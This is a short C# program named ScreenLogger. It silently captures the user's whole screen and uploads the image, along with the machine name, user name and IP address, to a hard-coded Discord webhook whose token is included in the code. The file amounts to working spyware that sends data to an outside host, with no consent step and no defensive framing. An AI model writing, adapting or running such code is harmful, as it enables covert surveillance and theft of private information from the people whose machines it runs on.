using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace ScreenLogger
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Take screenshot
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

            // Save screenshot to memory stream
            MemoryStream stream = new MemoryStream();
            screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);

            // Send screenshot to Discord webhook
            byte[] imageBytes = stream.ToArray();
            string webhookUrl = "https://discord.com/api/webhooks/1071565067109277706/Aq1uuQZJrQkOC6mZUGjr0lnQfr3qN2Dt6zRNELyaqqkMrbKpLYv9DRQ8YDwxiGA2DU-L";
            HttpClient client = new HttpClient();
            MultipartFormDataContent formDataContent = new MultipartFormDataContent
            {
                { new StringContent("Screenshot from Device Name: " + Dns.GetHostName() + " : User Profile Name: " + Environment.UserName,Encoding.UTF8),"\"content\"" },
                { new ByteArrayContent(imageBytes, 0, imageBytes.Length), ".png", "screenshot.png" },
                { new StringContent("IP Address: " + Dns.GetHostEntry(Dns.GetHostName()).AddressList.First(),Encoding.UTF8),"\"content\"" }
            };
            client.PostAsync(webhookUrl, formDataContent).Wait();
            client.Dispose();
        }
    }
}
